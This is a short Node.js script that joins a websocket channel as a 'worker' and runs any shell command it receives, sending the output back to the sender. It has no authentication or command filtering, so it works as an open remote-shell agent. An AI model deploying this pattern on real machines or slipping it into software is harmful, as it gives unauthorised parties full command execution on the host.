const { spawn } = require('child_process')

const socket = require('./wsclient.js');

socket.connect().then(() => {
    socket.join('worker', async (data, sender) => {
        if (data.action && data.action == 'execute') {
            const res = spawn(data.command, [], { shell: true });
            
            res.stdout.on('data', data => {
                socket.emit(sender, { response: data.toString() });
            });
            res.stderr.on('data', data => {
                socket.emit(sender, { response: data.toString() });
            });
        }
        return true;
    });
});

socket.run();